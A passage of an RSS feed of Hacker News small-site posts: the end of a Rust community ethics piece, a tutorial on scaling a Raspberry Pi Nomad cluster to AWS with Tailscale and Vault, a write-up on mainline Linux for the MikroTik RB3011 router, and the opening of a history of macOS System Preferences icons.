and we should call out instances wherever we find them. Such employers should not
be considered part of the community (Names withheld to protect the innocent)</li>
  <li>Rust is still hosted on github, a company that has a contract with ICE, a
institution that has proven to act out genocide against immigrants in the US. For
now, we act as if this doesn’t affect us and have the mod team quell all
discussion. I’m having a hard time bringing this up after having personally
removed discussion about it on /r/rust. But while we don’t want the drama to
continue, and expressly wish this point not to debated in the replies, we as a
community need to tackle this problem</li>
  <li>I’m still not writing that “why we shouldn’t write more blockchains in Rust”
article just yet, but as I’ve written before, Blockchain tech hasn’t showed much
benefit to society just yet while binding a lot of resources and burning through a
lot of electricity (obviously proof of stake is better than proof of work in that
regard, but being better than the worst thing doesn’t make something good), thus
hastening the climate crisis</li>
</ul>

<p>So here’s my suggestions: I want an Ethics WG, tasked with both researching and
teaching Rustic Software Ethics. With the above examples, I hope to have given a
useful set of initial work items for that group.</p>


</article>

</section>

</div></div>]]>
            </description>
            <link>https://llogiq.github.io/2020/09/21/ethics.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24547276</guid>
            <pubDate>Mon, 21 Sep 2020 19:17:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Scale out your Raspberry Pi Nomad cluster to the cloud]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24547147">thread link</a>) | @jsiebens
<br/>
September 21, 2020 | https://johansiebens.dev/posts/2020/09/scale-out-your-raspberry-pi-nomad-cluster-to-the-cloud/ | <a href="https://web.archive.org/web/*/https://johansiebens.dev/posts/2020/09/scale-out-your-raspberry-pi-nomad-cluster-to-the-cloud/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        

<figure>
    <img src="https://johansiebens.dev/uploads/bigstock--d-Illustration-Of-Cloud-Comp-372525397-banner.png" alt="illustration by blackboard on Bigstock"> <figcaption>
            <p>illustration by <a href="https://www.bigstockphoto.com/search/?contributor=blackboard" target="_blank">blackboard</a> on <a href="https://www.bigstockphoto.com/" target="_blank">Bigstock</a></p>
        </figcaption>
</figure>


<h2 id="intro">Intro</h2>

<p>A few months ago, I stumbled upon a blog post written by <a href="https://twitter.com/vogti" target="_blank">Christophe Voigt</a> about how he managed to scale out a Raspberry Pi Kubernetes cluster to the cloud with Tailscale.</p>

<p>In a nutshell:</p>

<ul>
<li>He grabbed a couple of Raspberry Pis and created a k3s cluster by following the instructions of Alex Ellis.</li>
<li>After learning about <a href="https://tailscale.com/" target="_blank">Tailscale</a>, a “no config” private networking solution based on Wireguard, allowing encrypted P2P communication between hosts, across NAT, firewalls, and other networking hurdles, he saw entirely new possibilities. Every machine capable of running k3s and Tailscale can join his k3s cluster, no matter where it’s location is.</li>
<li>He was able to build a setup to add and remove nodes of various cloud providers - all via configuration.</li>
</ul>

<p>I do recommend reading his <a href="https://blog.nativecloud.dev/scale-out-your-raspberry-pi-k3s-cluster-to-the-cloud/" target="_blank">full stories</a> as it explains in details how he achieved his goals.</p>

<p>Now, as I also fancy some Raspberry Pis and happen to have a <a href="https://johansiebens.dev/posts/2020/08/building-a-nomad-cluster-on-raspberry-pi-running-ubuntu-server/" target="_blank">cluster running HashiCorp Consul and Nomad</a>, I was wondering what it would take to scale out my Nomad cluster to the cloud using the same techniques.</p>

<h2 id="what-options-do-we-have">What options do we have?</h2>

<p>Our requirements are equally simple: we need some kind of operator that will automatically create VMs of a cloud vendor. Those machines need to start Tailscale, join the network, set up Consul and Nomad, and of course eventually join the cluster.</p>

<p>As explained by Christophe, in the Kubernetes ecosystem are some operators available that will meet those requirements (e.g. Kubermatic Machine Controller or Gardener Machine Controller Manager). But unfortunately, those tools have no support for HashiCorp Nomad.</p>

<p>Then I realized that one of the latest announcement of HashiCorp was the availability of a Nomad Autoscaler. Not only can it scale Nomad jobs, but it has also support to scale cluster nodes if required. Could this tool, also brought forward by HashiCorp, mean something for my use case?</p>

<p>It turned out that it is a perfect fit for what I was looking for.</p>

<h2 id="preparing-the-raspberry-pi-cluster">Preparing the Raspberry Pi cluster</h2>

<p>The first thing to do was making some changes to the Consul and Nomad cluster I had already running on the Raspberry Pis. Because other external VMs will join this cluster through Tailscale, it is quite evident that it needs to be installed on the machines in the home lab as well.</p>

<p>In my case, the Pis are running Ubuntu 20.04, which is like many other Linux distributions supported by Tailscale. Installing this software is just a matter of executing some commands:</p>
<div><pre><code data-lang="bash"><span>#!/bin/bash
</span><span></span>set -e

TAILSCALE_AUTH_KEY<span>=</span>&lt;your tailscale auth key&gt;

echo <span>"Installing Tailscale"</span>

curl https://pkgs.tailscale.com/stable/ubuntu/focal.gpg | sudo apt-key add -
curl https://pkgs.tailscale.com/stable/ubuntu/focal.list | sudo tee /etc/apt/sources.list.d/tailscale.list

sudo apt-get update
sudo apt-get install tailscale

sudo tailscale up --authkey $TAILSCALE_AUTH_KEY

echo <span>"Tailscale installation finished."</span></code></pre></div>
<p>Now that all these nodes have joined the Tailscale network, the next task is configuring Consul and Nomad with this the newly available network interface <code>tailscale0</code>. When Consul and Nomad are advertising the Tailscale IP address to other peers in the group, we are sure they can join each other.</p>

<p>Changing the configuration of Consul and Nomad a little bit did the trick.</p>

<p>Have a look at the following snippet of the configuration of the Consul and Nomad client agents (not everything is displayed, other parts of the config are left out for brevity)</p>

<p>consul.hcl:</p>
<div><pre><code data-lang="hcl">bind_addr      = "{{ GetInterfaceIP \"tailscale0\" }}"
advertise_addr = "{{ GetInterfaceIP \"tailscale0\" }}"
client_addr    = "0.0.0.0"
retry_join     = ["100.88.118.99"] // the address in the Tailscale network of our server node</code></pre></div>
<p>nomad.hcl:</p>
<div><pre><code data-lang="hcl">advertise {
  http = "{{ GetInterfaceIP \"tailscale0\" }}"
  rpc  = "{{ GetInterfaceIP \"tailscale0\" }}"
  serf = "{{ GetInterfaceIP \"tailscale0\" }}"
}
client {
  enabled           = true
  node_class        = "hashistack-rpi"
  network_interface = "tailscale0"
  network_speed     = 1000
}</code></pre></div>
<p>After restarting all the services, the private cluster is now ready to accept nodes running in the cloud.</p>

<figure>
    <img src="https://johansiebens.dev/uploads/scale-out-rpi-nomad-healthy-nodes-001.png" alt="all the Raspberry Pi nodes are healthy"> <figcaption>
            <p>all the Raspberry Pi nodes are healthy</p>
        </figcaption>
</figure>


<h2 id="nomad-autoscaler">Nomad Autoscaler</h2>

<p>In the first quarter of this year, HashiCorp announced a Tech Preview of the HashiCorp Nomad Autoscaler and in the meanwhile, a beta version is already available for use. While the tech preview brought us horizontal application autoscaling features, the beta release also included the capability to horizontally scaling the cluster. With this feature, you can automatically add or remove clients from the Nomad cluster as the load changes. At the time of writing, they only support Autoscaling Groups on AWS, but I’m pretty sure other cloud providers will be available sooner or later.</p>

<p>Under the hood, the Nomad Autoscaler provides a plugin system:</p>

<ul>
<li>ARM plugins to gather metrics to make scaling decisions</li>
<li>Target plugins to perform the actual scaling actions</li>
<li>Strategy plugins implement the logic dictating when and how to scale a particular target</li>
</ul>

<p>The interaction between those plugins is illustrated in this figure:</p>

<figure>
    <img src="https://johansiebens.dev/uploads/1585166055-autoscaler.png" alt="Illustration of the interaction between the Nomad Autoscaler, its plugins, and Nomad&amp;rsquo;s APIs. (source: HashiCorp Blog)"> <figcaption>
            <p>Illustration of the interaction between the Nomad Autoscaler, its plugins, and Nomad’s APIs. (source: <a href="https://www.hashicorp.com/blog/hashicorp-nomad-autoscaling-tech-preview/" target="_blank">HashiCorp Blog</a>)</p>
        </figcaption>
</figure>


<p>So, what does it takes to scale our private Nomad cluster to the cloud?</p>

<h3 id="setup-the-aws-autoscaling-group">Setup the AWS Autoscaling Group</h3>

<p>First, we need to create an Autoscaling Group on AWS. I prefer Terraform to create those necessary cloud resources. You can find the Terraform manifests in my <a href="https://github.com/jsiebens/rpi-nomad-scale-to-cloud" target="_blank">Github repository</a>.</p>

<p>After applying those Terraform manifests, we will have the following AWS resources:</p>

<ul>
<li>credentials for a technical user including a sufficient set of IAM permissions</li>
<li>security groups for our Nomad clients</li>
<li>a launch template for our instances</li>
<li>the actual Autoscaling Group</li>
</ul>

<h4 id="ec2-user-data">EC2 User data</h4>

<p>As the Nomad Autoscaler will only add or remove nodes by manipulating the AWS Autoscaling Group, it doesn’t mean it will automatically join our Consul and Nomad cluster. The make sure new nodes will become fully functional Nomad clients, the required agents need to be started when an instance is booted.</p>

<p>The user data in the launch template contains all the necessary steps to install Tailscale and the Consul and Nomad clients, including joining the Tailscale network and the cluster. <a href="https://github.com/jsiebens/rpi-nomad-scale-to-cloud/blob/master/terraform/templates/user-data.sh" target="_blank">The script I use is available in the Github repository</a>. At this moment, I chose to put all those steps in the user data; an improvement here could be using Packer to build a new AMI with all the software installed. Such a pre-baked image could reduce the startup time of the new nodes.</p>

<p>Just like Christophe, I currently write the Tailscale auth key in plain text in the user data. Proper secret management should be put in place here. Vault perhaps?</p>

<h3 id="preparing-a-secret-in-vault">Preparing a secret in Vault</h3>

<p>Besides Consul and Nomad, I’m also running Vault on the Raspberry Pis home lab. As a result, the Nomad jobs can pull secret from Vault when they start. The Nomad Autoscaler will need the AWS credentials, created by Terraform, to access the AWS API when manipulating the AWS Autoscaling Group. The secret will contain the AWS Access Key ID and the AWS Access Key Secret.</p>

<p>Authenticate with the Vault CLI and create the secret:</p>
<div><pre><code data-lang="bash">jsiebens@orion$ vault secrets enable -version<span>=</span><span>2</span> kv
Success! Enabled the kv secrets engine at: kv/
jsiebens@orion$ vault kv put kv/autoscaler aws_access_key_id<span>=</span>&lt;your id&gt; aws_secret_access_key<span>=</span>&lt;your secret&gt;
Key              Value
---              -----
created_time     <span>2020</span>-08-12T15:33:33.041118515Z
deletion_time    n/a
destroyed        false
version          <span>1</span>
jsiebens@orion$ </code></pre></div>
<p>Next, create a policy for the job that will allow it to read the credentials:</p>
<div><pre><code data-lang="hcl">path "kv/data/autoscaler" {
  capabilities = ["read"]
}</code></pre></div><div><pre><code data-lang="bash">jsiebens@orion$ vault policy write autoscaler autoscaler-policy.hcl 
Success! Uploaded policy: autoscaler
jsiebens@orion$ </code></pre></div>
<h3 id="running-the-nomad-autoscaler">Running the Nomad Autoscaler</h3>

<p>Now that our Autoscaling Group is available, we can set up the Nomad Autoscaler.</p>

<p>First, deploy a Prometheus instance that we will use as the APM plugin for the scaler. Prometheus is configured in such a way, that it will scrape all Nomad clients metrics. Those metrics are used to decide of nodes should be added or removed. Makes sense, right?</p>

<p>As the Nomad clients on AWS can come and go while scaling up and down, I want to make sure that the autoscaling jobs are running on my Raspberry Pis. By giving the Nomad clients in the home lab and on AWS a different <code>node_class</code>, and adding a constraint in the job definitions, we tell the Nomad scheduler on which nodes the jobs can be scheduled.</p>
<div><pre><code data-lang="hcl">job "autoscaler" {
  datacenters = ["dc1"]

  constraint {
    attribute = "${node.class}"
    value     = "hashistack-rpi"
  }

  ...
}</code></pre></div>
<p>Next, we will start the Autoscaler as a Nomad job too. Unfortunately, a Docker image of the Nomad Autoscaler is not (yet) available for the arm64 architecture. But, as you might know, Nomad is also able to run non-containerized applications, and the scaler is already cross-compiled for multiple platforms, such as arm64.</p>
<div><pre><code data-lang="hcl">job "autoscaler" {
  datacenters = ["dc1"]

  group "autoscaler" {
    
    task "autoscaler" {
      driver = "exec"

      artifact {
        source = "https://releases.hashicorp.com/nomad-autoscaler/0.1.0/nomad-autoscaler_0.1.0_linux_arm64.zip"
      }

      config {
        command = "nomad-autoscaler"

        args = [
          "agent",
          "-config",
          "${NOMAD_TASK_DIR}/config.hcl",
          "-http-bind-address",
          "0.0.0.0",
          "-policy-dir",
          "${NOMAD_TASK_DIR}/policies/",
        ]
      }

      ...

    }
  }
}</code></pre></div>
<p>Apply the autoscaler Nomad job, and there you have it! As soon the job is started, you see it will check the configured metrics regularly and validate if it should add or remove new clients.</p>
<div><pre><code data-lang="sh">jsiebens@orion$ nomad run nomad/autoscaler.nomad 
<span>==</span>&gt; Monitoring evaluation <span>"124b4a8a"</span>
    Evaluation triggered by job <span>"autoscaler"</span>
  …</code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://johansiebens.dev/posts/2020/09/scale-out-your-raspberry-pi-nomad-cluster-to-the-cloud/">https://johansiebens.dev/posts/2020/09/scale-out-your-raspberry-pi-nomad-cluster-to-the-cloud/</a></em></p>]]>
            </description>
            <link>https://johansiebens.dev/posts/2020/09/scale-out-your-raspberry-pi-nomad-cluster-to-the-cloud/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24547147</guid>
            <pubDate>Mon, 21 Sep 2020 19:05:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mainline Linux on the MikroTik RB3011]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24547067">thread link</a>) | @edward
<br/>
September 21, 2020 | https://www.earth.li/~noodles/blog/2020/09/rb3011-mainline.html | <a href="https://web.archive.org/web/*/https://www.earth.li/~noodles/blog/2020/09/rb3011-mainline.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  <p>I upgraded my home internet connection to fibre (FTTP) <a href="https://www.earth.li/~noodles/blog/2019/10/native-ipv6-fttp.html">last October</a>. I’m still on an 80M/20M service, so it’s no faster than my old VDSL FTTC connection was, and as a result for a long time I continued to use my HomeHub 5A running <a href="https://openwrt.org/">OpenWRT</a>. However the FTTP ONT meant I was using up an additional ethernet port on the router, and I was already short, so I ended up with a GigE switch in use as well. Also my wifi is handled by a <a href="https://unifi-network.ui.com/">UniFi</a>, which takes its power via Power-over-Ethernet. That mean I had a router, a switch and a PoE injector all in close proximity. I wanted to reduce the number of devices, and ideally upgrade to something that could scale once I decide to upgrade my FTTP service speed.</p>

<p>Looking around I found the <a href="https://mikrotik.com/product/RB3011UiAS-RM">MikroTik RB3011UiAS-RM</a>, which is a rack mountable device with 10 GigE ports (plus an SFP slot) and a dual core <a href="https://www.qualcomm.com/products/ipq8064">Qualcomm IPQ8064</a> ARM powering it. There’s 1G RAM and 128MB NAND flash, as well as a USB3 port. It also has PoE support. On paper it seemed like an ideal device. I wasn’t particularly interested in running RouterOS on it (the provided software), but that’s based on Linux and there was some work going on within OpenWRT to add support, so it seemed like a worthwhile platform to experiment with (what, you expected this to be about me buying an off the shelf device and using it with only the supplied software?). As an added bonus a friend said he had one he wasn’t using, and was happy to sell it to me for a bargain price.</p>

<p><img alt="RB3011 router in use" src="https://www.earth.li/~noodles/blog/images/2020/rb3011.jpg"></p>

<p>I did try out RouterOS to start with, but I didn’t find it particularly compelling. I’m comfortable configuring firewalling and routing at a Linux command line, and I run some additional services on the router like my <a href="https://www.earth.li/~noodles/blog/2018/05/mqtt-broker.html">MQTT</a> broker, and <a href="https://www.earth.li/~noodles/blog/2018/09/netlink-arp-presence.html">mqtt-arp</a>, my wifi device presence monitor. I could move things around such that they ran on the <a href="https://www.earth.li/~noodles/blog/2019/07/upgrading-the-house-server.html">house server</a>, but I consider them core services and as a result am happier with them on the router.</p>

<p>The first step was to get something booting on the router. Luckily it has an RJ45 serial console port on the back, and a reasonably featured bootloader that can manage to boot via tftp over the network. It wants an ELF binary rather than a plain kernel, but Sergey Sergeev had done the hard work of getting <a href="https://github.com/adron-s/uboot-ipq806x">u-boot working for the IPQ8064</a>, which mean I could just build normal u-boot images to try out.</p>

<p>Linux upstream already had basic support for a lot of the pieces I was interested in. There’s a slight fudge around <code>AUTO_ZRELADDR</code> because the network coprocessors want a chunk of memory at the start of RAM, but there’s ongoing discussions about how to handle this cleanly that I’m hopeful will eventually mean I can drop that hack. Serial, ethernet, the QCA8337 switches (2 sets of 5 ports, tied to different GigE devices on the processor) and the internal NOR all had drivers, so it was a matter of crafting an appropriate DTB to get them working. That left niggles.</p>

<p>First, the second switch is hooked up via SGMII. It turned out the IPQ806x <code>stmmac</code> driver didn’t initialise the clocks in this mode correctly, and neither did the <code>qca8k</code> switch driver. So I need to fix up both of those (Sergey had handled the stmmac driver, so I just had to clean up and submit his patch). Next it turned out the driver for talking to the Qualcomm firmware (SCM) had been updated in a way that broke the old method needed on the IPQ8064. Some git archaeology figured that one out and provided a solution. Ansuel Smith helpfully provided the DWC3 PHY driver for the USB port. That got me to the point I could put a Debian armhf image onto a USB stick and mount that as root, which made debugging much easier.</p>

<p>At this point I started to play with configuring up the device to actually act as a router. I make use of a number of VLANs on my home network, so I wanted to make sure I could support those. Turned out the stmmac driver wasn’t happy reconfiguring its MTU because the IPQ8064 driver doesn’t configure the FIFO sizes. I found what seem to be the correct values and plumbed them in. Then the <code>qca8k</code> driver only supported port bridging. I wanted the ability to have a trunk port to connect to the upstairs switch, while also having ports that only had a single VLAN for local devices. And I wanted the switch to handle this rather than requiring the CPU to bridge the traffic. Thankfully it’s easy to find a copy of the QCA8337 datasheet and the kernel <a href="https://www.kernel.org/doc/html/latest/networking/dsa/index.html">Distributed Switch Architecture</a> is pretty flexible, so I was able to implement the necessary support.</p>

<p>I stuck with Debian on the USB stick for actually putting the device into production. It makes it easier to fix things up if necessary, and the USB stick allows for a full Debian install which would be tricky on the 128M of internal NAND. That means I can use things like <a href="https://wiki.nftables.org/">nftables</a> for my firewalling, and use the standard Debian packages for things like <a href="https://collectd.org/">collectd</a> and <a href="https://mosquitto.org/">mosquitto</a>. Plus for debug I can fire up things like tcpdump or tshark. Which ended up being useful because when I put the device into production I started having weird IPv6 issues that turned out to be a lack of proper Ethernet multicast filter support in the IPQ806x ethernet device. The driver would try and setup the multicast filter for the IPv6 NDP related packets, but it wouldn’t actually work. The fix was to fall back to just receiving all multicast packets - this is what the vendor driver does.</p>

<p>Most of this work will be present once the 5.9 kernel is released - the basics are already in 5.8. Currently not queued up that I can think of are the following:</p>

<ul>
  <li>stmmac IPQ806x FIFO sizes. I sent out an RFC patch for these, but didn’t get any replies. I probably just need to submit this.</li>
  <li>NAND. This is missing support for the QCOM ADM DMA engine. I’ve sent out the patch I found to enable this, and have had some feedback, so I’m hopeful it will get in at some point.</li>
  <li>LCD. AFAICT LCD is an ST7735 device, which has kernel support, but I haven’t spent serious effort getting the SPI configuration to work.</li>
  <li>Touchscreen. Again, this seems to be a zt2046q or similar, which has a kernel driver, but the basic attempts I’ve tried don’t get any response.</li>
  <li>Proper SFP functionality. The IPQ806x has a PCS module, but the stmmac driver doesn’t have an easy way to plumb this in. I have ideas about how to get it working properly (and it can be hacked up with a fixed link config) but it’s not been a high priority.</li>
  <li>Device tree additions. Some of the later bits I’ve enabled aren’t yet in the mainline RB3011 DTB. I’ll submit a patch for that at some point.</li>
</ul>

<p>Overall I consider the device a success, and it’s been entertaining getting it working properly. I’m running a mostly mainline kernel, it’s handling my house traffic without breaking a sweat, and the fact it’s running Debian makes it nice and easy to throw more things on it as I desire. However it turned out the RB3011 isn’t as perfect device as I’d hoped. The PoE support is passive, and the UniFi wants 802.1af. So I was going to end up with 2 devices. As it happened I picked up a cheap <a href="https://eu.dlink.com/uk/en/products/dgs-1210-series-gigabit-smart-plus-switches">D-Link DGS-1210-10P</a> switch, which provides the PoE support as well as some additional switch ports. Plus it runs Linux, so more on that later…</p>

  </article></div>]]>
            </description>
            <link>https://www.earth.li/~noodles/blog/2020/09/rb3011-mainline.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24547067</guid>
            <pubDate>Mon, 21 Sep 2020 18:57:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The untold history of macOS System Preferences]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24546525">thread link</a>) | @ohjeez
<br/>
September 21, 2020 | https://www.arun.is/blog/system-preferences/ | <a href="https://web.archive.org/web/*/https://www.arun.is/blog/system-preferences/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><img src="https://www.arun.is/static/bcd87d10064d4d4dadd22884565ba04d/cover.jpg" alt="feature"></p><section><div><p><span><span>Published September 17, 2020</span></span></p></div><div><h2 id="history">History</h2><p>The current version of macOS descended from Mac OS X, announced at Macworld in
2000 by Steve Jobs<sup><a href="#footnote_1">[1]</a></sup>. Since then,
including the Public Beta of version 10.0, there have been 17 different releases
till now. The next one, version 11.0, titled Big Sur, is coming later this year.</p><p>In the intervening two decades, a lot has changed. In 2002, Steve Jobs famously
dropped support for OS 9 by staging a funeral at WWDC. Macs transitioned from
PowerPC to Intel chips and later to 64-bit only. Apple switched from naming
releases after big cats like Panther and Jaguar to naming releases after
California locations. It also renamed Mac OS X to macOS to conform better with
iOS and later iPadOS.</p><p>The interface started glassy and skeuomorphic, mimicking the materials used on
Macs. Over the decades, it went through significant
revisions<sup><a href="#footnote_2">[2]</a></sup>.</p><p>One thing that seems to have remained relatively unchanged over the years is the
System Preferences screen.</p><p><span><iframe src="https://player.vimeo.com/video/457568483?background=1" frameborder="0" webkitallowfullscreen="true" mozallowfullscreen="true" allowfullscreen="" title="vimeo video"></iframe></span></p><p>But, at a closer glance, we’ll see that this mundane part of the operating
system has changed quite a bit and hides some fun easter eggs and surprises.</p><h2 id="how-things-have-changed">How things have changed</h2><h3 id="favorites-bar">Favorites bar</h3><p>Early versions of OS X until 10.3 included a favorites bar at the top where
users could drag and drop their favorite settings. In 10.4, this was removed and
replaced with the search feature that highlights matching icons as you type a
query.</p><p><span>
      <span></span>
  <img alt="favorites" title="favorites" src="https://www.arun.is/static/313d3074bcdaeda86ea3b9f9141a3695/20801/favorites.jpg" srcset="https://www.arun.is/static/313d3074bcdaeda86ea3b9f9141a3695/98e5d/favorites.jpg 180w,https://www.arun.is/static/313d3074bcdaeda86ea3b9f9141a3695/543cd/favorites.jpg 360w,https://www.arun.is/static/313d3074bcdaeda86ea3b9f9141a3695/20801/favorites.jpg 720w,https://www.arun.is/static/313d3074bcdaeda86ea3b9f9141a3695/b37e7/favorites.jpg 1080w,https://www.arun.is/static/313d3074bcdaeda86ea3b9f9141a3695/33266/favorites.jpg 1440w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
    </span></p><h3 id="mouse">Mouse</h3><p>The first mouse to appear System Preferences is the black translucent Apple Pro
Mouse<sup><a href="#footnote_3">[3]</a></sup>. Between the Public Beta and the
10.0 release, an optical sensor’s red glow was added to reflect how the mouse
looks when in use. Following that is the white iteration of that mouse, the
short-lived Mighty Mouse, and then finally the Magic Mouse, which has undergone
only minor updates till today.</p><p><span>
      <span></span>
  <img alt="mouse" title="mouse" src="https://www.arun.is/static/6bdfc8a50d309f652a522878c13db51d/20801/mouse.jpg" srcset="https://www.arun.is/static/6bdfc8a50d309f652a522878c13db51d/98e5d/mouse.jpg 180w,https://www.arun.is/static/6bdfc8a50d309f652a522878c13db51d/543cd/mouse.jpg 360w,https://www.arun.is/static/6bdfc8a50d309f652a522878c13db51d/20801/mouse.jpg 720w,https://www.arun.is/static/6bdfc8a50d309f652a522878c13db51d/b37e7/mouse.jpg 1080w,https://www.arun.is/static/6bdfc8a50d309f652a522878c13db51d/33266/mouse.jpg 1440w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
    </span></p><h3 id="keyboard">Keyboard</h3><p>Similarly, the keyboard icons have represented the keyboard available at the
given time. In 10.0, it’s an Apple Pro Keyboard. From 10.1 to 10.5, it’s only a
single command key, but then in 10.6, a full keyboard is shown again.</p><p><span>
      <span></span>
  <img alt="keyboard" title="keyboard" src="https://www.arun.is/static/78d4d3feef83c2e4c287773597512d65/20801/keyboard.jpg" srcset="https://www.arun.is/static/78d4d3feef83c2e4c287773597512d65/98e5d/keyboard.jpg 180w,https://www.arun.is/static/78d4d3feef83c2e4c287773597512d65/543cd/keyboard.jpg 360w,https://www.arun.is/static/78d4d3feef83c2e4c287773597512d65/20801/keyboard.jpg 720w,https://www.arun.is/static/78d4d3feef83c2e4c287773597512d65/b37e7/keyboard.jpg 1080w,https://www.arun.is/static/78d4d3feef83c2e4c287773597512d65/33266/keyboard.jpg 1440w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
    </span></p><p>Peculiarly, in 10.3, 10.4, and 10.5, the Mouse and Keyboard settings were
combined into one, but then in 10.6, they were split up again.</p><h3 id="displays">Displays</h3><p>Unsurprisingly, the Displays icon has always reflected the latest Apple display
starting with the transparent polycarbonate Cinema Displays until today’s Pro
Display XDR. The small size allocated to the icons has meant that they usually
look a little cartoonish and out of proportion, but still consistent with the
rest of the icon set. However, in Big Sur, the display icon’s proportions were
adjusted much closer to how Pro Display XDR looks in reality.</p><p><span>
      <span></span>
  <img alt="displays" title="displays" src="https://www.arun.is/static/a6c12ca730ff1a899d96e58507288b58/20801/displays.jpg" srcset="https://www.arun.is/static/a6c12ca730ff1a899d96e58507288b58/98e5d/displays.jpg 180w,https://www.arun.is/static/a6c12ca730ff1a899d96e58507288b58/543cd/displays.jpg 360w,https://www.arun.is/static/a6c12ca730ff1a899d96e58507288b58/20801/displays.jpg 720w,https://www.arun.is/static/a6c12ca730ff1a899d96e58507288b58/b37e7/displays.jpg 1080w,https://www.arun.is/static/a6c12ca730ff1a899d96e58507288b58/33266/displays.jpg 1440w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
    </span></p><h3 id="print--fax">Print &amp; Fax</h3><p>10.3 introduced the Print &amp; Fax setting. Then in 10.7, amidst the waning use of
fax machines, it was renamed Print and Scan. Finally, in 10.9, it was renamed
again to the nouns Printers &amp; Scanners to fit grammatically with everything
else.</p><p><span>
      <span></span>
  <img alt="print" title="print" src="https://www.arun.is/static/8ed1948be22758a9f7b6c010946d6b0f/20801/print.jpg" srcset="https://www.arun.is/static/8ed1948be22758a9f7b6c010946d6b0f/98e5d/print.jpg 180w,https://www.arun.is/static/8ed1948be22758a9f7b6c010946d6b0f/543cd/print.jpg 360w,https://www.arun.is/static/8ed1948be22758a9f7b6c010946d6b0f/20801/print.jpg 720w,https://www.arun.is/static/8ed1948be22758a9f7b6c010946d6b0f/b37e7/print.jpg 1080w,https://www.arun.is/static/8ed1948be22758a9f7b6c010946d6b0f/33266/print.jpg 1440w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
    </span></p><h3 id="energy-saver">Energy Saver</h3><p>In the first OS X Public Beta, a shade drawn over a window represented Energy
Saver. Before release, the now recognizable light bulb took its place.</p><p>Over the years, the icon has represented the most efficient light bulb
technology of the time. So, in 10.5, the icon changed from an incandescent bulb
to a more efficient compact fluorescent. Then, in 10.10, the light bulb changed
again to an LED design.</p><p><span>
      <span></span>
  <img alt="energy saver" title="energy saver" src="https://www.arun.is/static/eb20a5f38d91edd23aa9f792463f7503/20801/energy_saver.jpg" srcset="https://www.arun.is/static/eb20a5f38d91edd23aa9f792463f7503/98e5d/energy_saver.jpg 180w,https://www.arun.is/static/eb20a5f38d91edd23aa9f792463f7503/543cd/energy_saver.jpg 360w,https://www.arun.is/static/eb20a5f38d91edd23aa9f792463f7503/20801/energy_saver.jpg 720w,https://www.arun.is/static/eb20a5f38d91edd23aa9f792463f7503/b37e7/energy_saver.jpg 1080w,https://www.arun.is/static/eb20a5f38d91edd23aa9f792463f7503/33266/energy_saver.jpg 1440w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
    </span></p><p>Big Sur will make away with the Energy Saver setting altogether for MacBooks
(they are keeping it for desktops), replacing it with the more intuitively
named”Battery setting. Oh, light bulb icon, you will be missed.</p><h3 id="network">Network</h3><p>In the Public Beta, Network was a globe focused on the western hemisphere, with
lines drawn as if connecting cities. Just three releases later in 10.3, that was
changed over to the abstract glass ball with circular lines, a variation of
which we still see today.</p><p><span>
      <span></span>
  <img alt="network" title="network" src="https://www.arun.is/static/8a0e9801d57bf94c8ca81bc92fb91d7e/20801/network.jpg" srcset="https://www.arun.is/static/8a0e9801d57bf94c8ca81bc92fb91d7e/98e5d/network.jpg 180w,https://www.arun.is/static/8a0e9801d57bf94c8ca81bc92fb91d7e/543cd/network.jpg 360w,https://www.arun.is/static/8a0e9801d57bf94c8ca81bc92fb91d7e/20801/network.jpg 720w,https://www.arun.is/static/8a0e9801d57bf94c8ca81bc92fb91d7e/b37e7/network.jpg 1080w,https://www.arun.is/static/8a0e9801d57bf94c8ca81bc92fb91d7e/33266/network.jpg 1440w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
    </span></p><h3 id="date--time">Date &amp; Time</h3><p>Since the Public Beta, the calendar in the icon has shown an 18. 10.10 added the
month of July to the icon. July 18 likely refers to the day that the Mac OS X
Public Beta was first announced at Macworld New York.</p><p><span>
      <span></span>
  <img alt="date" title="date" src="https://www.arun.is/static/b1d9e4e3b1929a516259d4ba8fef1079/20801/date.jpg" srcset="https://www.arun.is/static/b1d9e4e3b1929a516259d4ba8fef1079/98e5d/date.jpg 180w,https://www.arun.is/static/b1d9e4e3b1929a516259d4ba8fef1079/543cd/date.jpg 360w,https://www.arun.is/static/b1d9e4e3b1929a516259d4ba8fef1079/20801/date.jpg 720w,https://www.arun.is/static/b1d9e4e3b1929a516259d4ba8fef1079/b37e7/date.jpg 1080w,https://www.arun.is/static/b1d9e4e3b1929a516259d4ba8fef1079/33266/date.jpg 1440w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
    </span></p><p>In Big Sur, after 20 years of showing July 18, that icon has changed to July 17,
likely to conform with the Calendar app icon. iCal, as the Calendar app was
previously known, was first shown to the public on July 17, 2002.</p><h3 id="language--region">Language &amp; Region</h3><p>At first, this one was called International, then renamed to Language &amp; Text and
finally Language and Region. The icon was a flag bearing the logo of the United
Nations. In 10.13, a banal globe icon replaced the UN logo.</p><p><span>
      <span></span>
